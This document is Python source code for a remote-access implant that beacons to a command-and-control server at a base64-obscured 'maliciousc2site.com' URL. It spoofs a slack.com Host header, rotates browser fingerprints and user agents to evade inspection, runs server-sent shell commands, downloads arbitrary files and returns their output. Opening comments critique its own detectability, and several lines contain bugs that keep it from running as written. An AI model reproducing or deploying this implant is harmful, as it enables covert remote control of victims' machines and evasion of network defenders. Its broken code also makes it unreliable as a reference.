#plain json payloads make this setup detectable by DPI (Deep Packet Inspection)
#No encryption at end point security (visible data)
#limited user-agent list and predictable end points

import time
import uuid
import requests
import subprocess
import random
from cryptography.fernet import Fernet
import json
import tls_client
import base64
from datetime import datetime

####Configuration####
SERVER_URL = base64.base64.b64decode("aHR0cHM6Ly9tYWxpY2lvdXNjMnNpdGUuY29t") #base64 encdoed version of https://maliciousc2site.com
BEACON_ENDPOINT = "/beacon"
RESULT_ENDOINT = "/result"
SLEEP_MIN = 10
SLEEP_MAX = 30
# This key must be the same on client and server
SECRET_KEY = b'YOUR_SECRET_KEY=='
cipher = Fernet(SECRET_KEY)

session = tls_client.Session(client_identifier="chrome_110") #rotate between "chrome_112"/"firefox_108"/"safari_16_0"

#Generate a unique id for this agent
AGENT_ID = str(uuid.uuid4())

#Fake user agents with normal traffic to blend
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3) AppleWebKit/605.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15",
    "Mozilla 5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
]


def encrypt_data(data):
    encoded = data.encode()
    encrypted = cipher.encrypt(encoded)
    return encrypted.decode()

def decrypt_data(data):
    decrypted = cipher.decrypt(data.encode())
    return decrypted.decode()


#User-Agent is a header sent by the client to the server reuqesting for the correct appearance of a website on th edevice browser with compatibility
def beacon():
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Host": "slack.com",
        "Authorization": f"Bearer {AGENT_ID}",
        "X-Session-ID": str(uuid.uuid4())
    }
    raw_payload = {"id": AGENT_ID}
    encrypted_payload = encrypt_data(json.dumps(raw_payload))

    try:
        response = session.post(
            SERVER_URL + BEACON_ENDPOINT, 
            json={"data": encrypted_payload}, 
            headers=headers,
            timeout = 10
        )
        if response.status_code == 200:
            encrypted = response.json()
            decrypted_json = decrypt_data(encrypted)
            data = json.loads(decrypted_json)
            task = data.get("task")
            if task:
                execute_task(task)
    except Exception as e:
        print(f"[!] Beacon error: {e}")

def execute_task(task_data):
    task_type = task_data.data.get("type")

    if task_type == "shell":
        command = task_data.get("command")
        run_shell(command)
    elif task_type == "download":
        url = task_data.get("url")
        save_as = task_data.get("save_as")
        download_file(url, save_as)
    elif task_type == "sleep":
        global SLEEP_MIN, SLEEP_MAX
        SLEEP_MIN = task_data.get("min", SLEEP_MIN)
        SLEEP_MAX = task_data.get("max", SLEEP_MAX)
    else:
        print(f"[!] Unknown task type: {task_type}")
    
def run_shell(command):
    try:
        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        post_result(result.decode())
    except subprocess.CalledProcessError as e:
        post_result(e.output.decode())

def download_file(url, save_as):
    try:
        response = requests.get(url, stream=True)
        with open(save_as, 'wb') as f:
            for chunk in response.iter_content(chunk_size=8192):
                f.write(chunk)
        post_result(f"[+] Downloaded {url} as {save_as}")
    except Exception as e:
        post_result(f"[!] Downloaded error: {str(e)}")

def post_result(result):
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Authorization": f"Bearer {AGENT_ID}",
        "X-Session-ID": str(uuid.uuid4())
    }
    raw_payload = {"id": AGENT_ID, "output":result}
    encrypted_payload = encrypt_data(json.dumps(raw_payload))

    try:
        requests.post(
            SERVER_URL + RESULT_ENDOINT, 
            json={"data": encrypted_payload}, 
            headers=headers
        )
    except Exception as e:
        print(f"[!] Result posting error: {e}")

def dynamic_sleep():
    current_hour = datetime.now().hour

    if 9 <= current_hour <= 17:
        return random.randint(SLEEP_MIN, SLEEP_MAX)
    else: #nights/weekends
        return random.randint(SLEEP_MIN * 2, SLEEP_MAX * 3)

def main():
    while True:
        beacon()
        sleep_time = dynamic_sleep()
        time.sleep(sleep_time)

if __name__ == "__main__":
    main()

